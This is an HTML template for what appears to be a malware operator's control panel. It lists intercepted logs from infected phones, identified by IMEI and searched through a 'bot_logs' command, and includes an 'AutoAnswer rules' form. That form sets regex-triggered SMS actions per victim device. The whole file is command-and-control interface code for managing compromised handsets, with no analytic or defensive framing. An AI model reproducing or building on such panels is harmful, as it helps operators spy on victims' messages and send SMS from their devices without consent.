
<div class="demo-charts mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" style="background-color: #37474f;"> 
    <h5 style="color: white;"><i class="material-icons" style="color: white; margin-right: 20px;">poll</i>Total logs: %%PLACE_TOTAL_ITEMS_HERE%%</h5>
</div>
<div  class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid">
    <div class="mdl-tabs mdl-js-tabs mdl-js-ripple-effect">
        <div class="mdl-tabs__tab-bar">
            <a href="#main-logs-panel" class="mdl-tabs__tab is-active">Logs</a>
            <a href="#rule-logs-panel" class="mdl-tabs__tab">AutoAnswer rules</a>
        </div>

        <div class="mdl-tabs__panel is-active" id="main-logs-panel">
            <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
                <input class="mdl-textfield__input" type="text" id="IMEI_search">
                <label class="mdl-textfield__label" for="IMEI_search">IMEI search...</label>
            </div>

            <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
                <input class="mdl-textfield__input" type="text" id="TEXT_search">
                <label class="mdl-textfield__label" for="TEXT_search">TEXT search...</label>
            </div>
            <button style="margin-left: 10px;margin-top: 15px;" class="mdl-button" onclick="location.href='index.php?command=bot_logs&text=' + $('#TEXT_search').val() + '&imei=' + $('#IMEI_search').val()"><i class="material-icons">search</i>
            </button>

            <div style="width: 100%; margin-top: 10px;">
                <table class="mdl-shadow--2dp tmain" cellpadding="1" align="center" width=100%>      
                <thead>
                    <th>IMEI</th>
                    <th>text</th>
                    <th>date</th>
                </thead>
                %%PLACE_TABLE_HERE%%
                </table>
            </div>
        </div>
        <div class="mdl-tabs__panel is-active" id="rule-logs-panel">
            <div style="width: calc(100% - 16px);" class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid">
                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 150px;">
                    <input class="mdl-textfield__input" type="text" id="IMEI_rule">
                    <label class="mdl-textfield__label" for="IMEI_rule">IMEI...</label>
                </div>
                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 150px;">
                    <input class="mdl-textfield__input" type="text" id="reg_rule">
                    <label class="mdl-textfield__label" for="reg_rule">reg rule...</label>
                </div>
                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 150px; display: none">
                    <input class="mdl-textfield__input" type="text" id="action_rule" value="sms">
                    <label class="mdl-textfield__label" for="action_rule">action...</label>
                </div>
                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 150px; display: none">
                    <input class="mdl-textfield__input" type="text" id="param1_rule" value="$1">
                    <label class="mdl-textfield__label" for="param1_rule">param1...</label>
                </div>
                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 150px; display: none">
                    <input class="mdl-textfield__input" type="text" id="param2_rule" value="$2">
                    <label class="mdl-textfield__label" for="param2_rule">param2...</label>
                </div>
                <button style="margin-left: 10px;margin-top: 15px;" class="mdl-button" onclick="add_answer_rule();"><i class="material-icons">note_add</i>
                </button>
            </div>

            <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
                <input class="mdl-textfield__input" type="text" id="IMEI_search">
                <label class="mdl-textfield__label" for="IMEI_search">IMEI search...</label>
            </div>

            <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
                <input class="mdl-textfield__input" type="text" id="TEXT_search">
                <label class="mdl-textfield__label" for="TEXT_search">TEXT search...</label>
            </div>
            <button style="margin-left: 10px;margin-top: 15px;" class="mdl-button" onclick="location.href='index.php?command=bot_logs&text=' + $('#TEXT_search').val() + '&imei=' + $('#IMEI_search').val()"><i class="material-icons">search</i>
            </button>

            <div style="width: 100%; margin-top: 10px;">
                %%PLACE_TABLE1_HERE%%
            </div>
        </div>
    </div>

    <div id = "logs_modal" style="display:none;"></div>
    <div id = "commands_modal" style="display:none;"></div>

    <div style="width: 100%">
</div>
